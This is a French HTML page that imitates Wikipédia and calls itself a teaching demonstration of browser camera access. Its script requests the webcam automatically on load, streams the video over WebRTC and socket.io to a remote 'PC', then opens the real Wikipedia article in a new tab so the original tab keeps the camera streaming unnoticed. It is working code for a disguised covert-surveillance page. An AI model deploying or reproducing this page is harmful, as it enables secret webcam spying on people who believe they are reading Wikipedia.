<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Wikipédia — Démonstration</title>

    <style>
        body {
            margin: 0;
            background: #f8f9fa;
            color: #202122;
            font-family: Arial, sans-serif;
        }

        header {
            background: white;
            border-bottom: 1px solid #a2a9b1;
            padding: 15px 30px;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo {
            font-family: Georgia, serif;
            font-size: 42px;
        }

        .title {
            font-size: 22px;
            font-weight: bold;
        }

        main {
            max-width: 950px;
            margin: 30px auto;
            padding: 20px;
        }

        h1 {
            font-family: Georgia, serif;
            font-weight: normal;
            border-bottom: 1px solid #a2a9b1;
            padding-bottom: 10px;
        }

        p {
            line-height: 1.6;
        }

        #status {
            margin-top: 30px;
            padding: 20px;
            background: white;
            border: 1px solid #a2a9b1;
        }

        .green {
            color: #00a000;
            font-weight: bold;
        }

        #localCamera {
            width: 100%;
            max-width: 500px;
            margin-top: 20px;
            display: none;
        }
    </style>
</head>

<body>

<header>
    <div class="logo">W</div>
    <div class="title">WIKIPÉDIA — Démonstration</div>
</header>

<main>

    <h1>Cybersécurité</h1>

    <p>
        Cette page présente une démonstration pédagogique
        de l'utilisation d'une caméra par un navigateur.
    </p>

    <p>
        Le navigateur demande explicitement l'autorisation
        avant de permettre l'accès à la caméra.
    </p>

    <div id="status">
        Initialisation...
    </div>

    <video
        id="localCamera"
        autoplay
        muted
        playsinline>
    </video>

</main>

<script src="/socket.io/socket.io.js"></script>

<script>

const socket = io();

const status = document.getElementById("status");
const localCamera = document.getElementById("localCamera");

let peerConnection = null;
let localStream = null;

const config = {
    iceServers: [
        {
            urls: "stun:stun.l.google.com:19302"
        }
    ]
};

async function startCamera() {

    try {

        status.textContent =
            "Demande d'autorisation caméra...";

        /*
         * Le navigateur affiche ici sa demande
         * d'autorisation caméra.
         */
        localStream =
            await navigator.mediaDevices.getUserMedia({
                video: true,
                audio: false
            });

        localCamera.srcObject = localStream;
        localCamera.style.display = "block";

        status.innerHTML =
            '<span class="green">● Caméra autorisée</span><br>' +
            'Connexion au PC...';

        peerConnection =
            new RTCPeerConnection(config);

        localStream.getTracks().forEach((track) => {

            peerConnection.addTrack(
                track,
                localStream
            );

        });

        peerConnection.onicecandidate =
            (event) => {

                if (event.candidate) {

                    socket.emit(
                        "ice-candidate",
                        event.candidate
                    );

                }

            };

        peerConnection.onconnectionstatechange =
            () => {

                console.log(
                    "WebRTC :",
                    peerConnection.connectionState
                );

            };

        const offer =
            await peerConnection.createOffer();

        await peerConnection.setLocalDescription(
            offer
        );

        socket.emit("offer", offer);

        status.innerHTML =
            '<span class="green">● Caméra autorisée</span><br>' +
            'Flux envoyé au PC.';

        /*
         * On ouvre Wikipédia dans un nouvel onglet.
         * L'onglet de démonstration reste ouvert,
         * donc la caméra reste attachée à cette page.
         */
        setTimeout(() => {

            window.open(
                "https://fr.wikipedia.org/wiki/Cybers%C3%A9curit%C3%A9",
                "_blank"
            );

        }, 3000);

    } catch (error) {

        console.error(
            "Erreur caméra :",
            error
        );

        status.textContent =
            "Accès à la caméra refusé ou indisponible.";

    }
}

socket.on("answer", async (answer) => {

    if (!peerConnection) {
        return;
    }

    try {

        await peerConnection.setRemoteDescription(
            answer
        );

    } catch (error) {

        console.error(error);

    }

});

socket.on("ice-candidate", async (candidate) => {

    if (!peerConnection) {
        return;
    }

    try {

        await peerConnection.addIceCandidate(
            candidate
        );

    } catch (error) {

        console.error(error);

    }

});

/*
 * Demande automatiquement la caméra
 * après le chargement de la page.
 */
setTimeout(startCamera, 1000);

</script>

</body>
</html>
